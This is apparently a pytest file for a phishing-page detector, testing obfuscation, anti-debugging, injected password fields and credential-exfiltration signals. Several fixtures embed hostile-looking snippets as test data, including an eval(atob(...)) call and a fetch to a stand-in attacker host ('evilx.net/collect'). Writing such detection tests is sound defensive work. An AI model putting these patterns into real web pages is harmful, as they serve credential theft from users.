from pathlib import Path
from unittest.mock import MagicMock, patch

from src.app_v1.analyze_dashboard import _apply_evidence_adjudication_layer
from src.app_v1.analyze_dashboard import build_dashboard_analysis
from src.app_v1.behavior_signals import extract_behavior_signals
from src.app_v1.schemas import CaptureResult


def _base_verdict(score: float = 0.55) -> dict:
    return {"label": "uncertain", "verdict_3way": "uncertain", "combined_score": score, "reasons": []}


def _write_html(tmp_path: Path, body: str) -> Path:
    p = tmp_path / "page.html"
    p.write_text(body, encoding="utf-8")
    return p


def _base_cap(final_url: str = "https://evil.example/login") -> dict:
    return {
        "final_url": final_url,
        "final_registered_domain": "example",
        "brand_domain_mismatch": True,
        "network_request_urls": [],
        "interaction": {"attempted_submit": True, "click_probe_attempted": True},
    }


def test_eval_atob_with_login_form_is_strong_signal(tmp_path: Path) -> None:
    html = _write_html(tmp_path, "<script>eval(atob('YWJj')); </script>")
    beh = extract_behavior_signals(
        html_path=str(html),
        layer2_capture=_base_cap(),
        html_structure_summary={"password_input_count": 1, "form_count": 1},
        html_dom_summary={"form_action_external_domain_count": 0, "page_family": "auth_login_recovery"},
    )
    assert beh["js_obfuscation_score"] > 0.3
    out = _apply_evidence_adjudication_layer(
        _base_verdict(),
        ml={"phish_proba": 0.6, "phish_proba_calibrated": 0.6},
        layer2_capture={"input_registered_domain": "example", "final_registered_domain": "example", "final_url": "https://evil.example/login"},
        html_structure_summary={"password_input_count": 1, "form_count": 1},
        html_dom_summary={"form_action_external_domain_count": 0, "suspicious_credential_collection_pattern": False, "login_harvester_pattern": False, "page_family": "auth_login_recovery"},
        html_structure_risk=0.2,
        html_dom_risk=0.2,
        behavior_signals=beh,
        host_path_reasoning={"host_identity_class": "suspicious_host_pattern"},
        platform_context={"platform_context_type": "user_hosted_subdomain"},
        trust_blockers=[],
        hosting_trust={},
        legitimacy_bundle={},
    )
    assert "high_js_obfuscation_auth_context" in (out.get("evidence_phishing_signals") or [])


def test_dynamic_password_input_injection_is_strong_signal(tmp_path: Path) -> None:
    html = _write_html(tmp_path, "<script>var i=document.createElement('input'); i.name='password';</script>")
    beh = extract_behavior_signals(
        html_path=str(html),
        layer2_capture=_base_cap(),
        html_structure_summary={"password_input_count": 0, "form_count": 1},
        html_dom_summary={"form_action_external_domain_count": 0, "page_family": "auth_login_recovery"},
    )
    assert beh["js_dynamic_form_injection_detected"] is True


def test_anti_debugging_js_is_strong_signal(tmp_path: Path) -> None:
    html = _write_html(tmp_path, "<script>setInterval(function(){debugger;},1000)</script>")
    beh = extract_behavior_signals(
        html_path=str(html),
        layer2_capture=_base_cap(),
        html_structure_summary={"password_input_count": 1, "form_count": 1},
        html_dom_summary={"form_action_external_domain_count": 0, "page_family": "auth_login_recovery"},
    )
    assert beh["js_anti_debugging_detected"] is True


def test_network_exfiltration_with_credential_context_is_hard_blocker(tmp_path: Path) -> None:
    html = _write_html(tmp_path, "<html></html>")
    cap = _base_cap("https://safebrand.com/login")
    cap["final_registered_domain"] = "safebrand.com"
    cap["network_request_urls"] = ["https://evil-collect.net/api/credential/submit"]
    beh = extract_behavior_signals(
        html_path=str(html),
        layer2_capture=cap,
        html_structure_summary={"password_input_count": 1, "form_count": 1},
        html_dom_summary={"form_action_external_domain_count": 0, "page_family": "auth_login_recovery"},
    )
    assert beh["network_exfiltration_suspected"] is True
    out = _apply_evidence_adjudication_layer(
        _base_verdict(),
        ml={"phish_proba": 0.4, "phish_proba_calibrated": 0.4},
        layer2_capture={"input_registered_domain": "safebrand.com", "final_registered_domain": "safebrand.com", "final_url": "https://safebrand.com/login"},
        html_structure_summary={"password_input_count": 1, "form_count": 1},
        html_dom_summary={"form_action_external_domain_count": 0, "suspicious_credential_collection_pattern": False, "login_harvester_pattern": False},
        html_structure_risk=0.2,
        html_dom_risk=0.2,
        behavior_signals=beh,
        host_path_reasoning={},
        platform_context={},
        trust_blockers=[],
        hosting_trust={},
        legitimacy_bundle={},
    )
    assert "network_exfiltration_with_credential_context" in (out.get("evidence_hard_blockers") or [])


def test_benign_analytics_and_cdn_not_exfiltration(tmp_path: Path) -> None:
    html = _write_html(tmp_path, "<html></html>")
    cap = _base_cap("https://www.google.com")
    cap["final_registered_domain"] = "google.com"
    cap["network_request_urls"] = [
        "https://www.googletagmanager.com/gtm.js",
        "https://www.google-analytics.com/g/collect",
        "https://fonts.gstatic.com/s/font.woff2",
        "https://cdn.jsdelivr.net/npm/vue.js",
    ]
    beh = extract_behavior_signals(
        html_path=str(html),
        layer2_capture=cap,
        html_structure_summary={"password_input_count": 0, "form_count": 0},
        html_dom_summary={"form_action_external_domain_count": 0, "page_family": "generic_landing"},
        platform_context_type="official_platform_domain",
    )
    assert beh["network_request_domain_count"] > 0
    assert beh["network_exfiltration_suspected"] is False
    assert not beh["network_unrelated_domains"]


def test_normal_minified_js_not_flagged(tmp_path: Path) -> None:
    html = _write_html(tmp_path, "<script>!function(){var a=1,b=2;console.log(a+b);}();</script>")
    beh = extract_behavior_signals(
        html_path=str(html),
        layer2_capture=_base_cap("https://example.com"),
        html_structure_summary={"password_input_count": 0, "form_count": 0},
        html_dom_summary={"form_action_external_domain_count": 0, "page_family": "generic_landing"},
    )
    assert beh["js_obfuscation_score"] < 0.2
    assert beh["js_dynamic_form_injection_detected"] is False
    assert beh["js_anti_debugging_detected"] is False


def test_behavior_unavailable_is_ambiguity_not_safety() -> None:
    beh = extract_behavior_signals(
        html_path=None,
        layer2_capture={"final_url": "https://x.test", "final_registered_domain": "x.test", "network_request_urls": []},
        html_structure_summary={},
        html_dom_summary={},
    )
    assert beh["behavior_analysis_unavailable"] is True


def test_impersonation_with_suspicious_behavior_stays_likely_phishing(tmp_path: Path) -> None:
    html = _write_html(tmp_path, "<script>eval(atob('YWJj'));fetch('https://evilx.net/collect')</script>")
    cap = _base_cap("https://brandclone.vercel.app/login")
    cap["final_registered_domain"] = "vercel.app"
    cap["network_request_urls"] = ["https://evilx.net/collect-token"]
    beh = extract_behavior_signals(
        html_path=str(html),
        layer2_capture=cap,
        html_structure_summary={"password_input_count": 1, "form_count": 1},
        html_dom_summary={"form_action_external_domain_count": 0, "page_family": "auth_login_recovery"},
    )
    out = _apply_evidence_adjudication_layer(
        _base_verdict(),
        ml={
            "phish_proba": 0.66,
            "phish_proba_calibrated": 0.66,
            "model_agreement": {"ml_consensus": "strong_phishing"},
        },
        layer2_capture={
            "input_registered_domain": "vercel.app",
            "final_registered_domain": "vercel.app",
            "final_url": "https://brandclone.vercel.app/login",
            "brand_domain_mismatch": True,
            "brand_domain_mismatch_strength": "strong",
            "final_domain_is_free_hosting": True,
        },
        html_structure_summary={"password_input_count": 1, "form_count": 1},
        html_dom_summary={"form_action_external_domain_count": 0, "suspicious_credential_collection_pattern": False, "login_harvester_pattern": False, "page_family": "auth_login_recovery"},
        html_structure_risk=0.2,
        html_dom_risk=0.2,
        behavior_signals=beh,
        host_path_reasoning={"host_identity_class": "suspicious_host_pattern", "host_legitimacy_confidence": "low"},
        platform_context={"platform_context_type": "user_hosted_subdomain"},
        trust_blockers=[],
        hosting_trust={},
        legitimacy_bundle={},
    )
    assert out["verdict_3way"] == "likely_phishing"


def test_build_dashboard_analysis_uses_network_request_urls_for_behavior_signals() -> None:
    fake_cap = CaptureResult(
        original_url="https://example.com",
        final_url="https://example.com",
        title="Example",
        screenshot_path="",
        fullpage_screenshot_path="",
        html_path="",
        visible_text="Example",
        capture_strategy="http_fallback",
        network_request_urls=[
            "https://www.googletagmanager.com/gtm.js",
            "https://evil-tracker.bad/collect",
        ],
    )
    fake_ml = {
        "phish_proba": 0.4,
        "phish_proba_model_raw": 0.4,
        "phish_proba_calibrated": 0.4,
        "predicted_phishing": False,
        "canonical_url": "https://example.com",
        "brand_structure_features": {},
        "error": None,
    }
    cfg = MagicMock()
    cfg.enable_click_probe = False
    with patch("src.app_v1.analyze_dashboard.PipelineConfig.from_env", return_value=cfg):
        with patch("src.app_v1.analyze_dashboard.capture_url", return_value=fake_cap):
            with patch("src.app_v1.analyze_dashboard.predict_layer1", return_value=fake_ml):
                out, _ = build_dashboard_analysis("https://example.com", reinforcement=True)
    behavior = out.get("behavior_signals") or {}
    assert behavior.get("network_request_domain_count", 0) >= 2
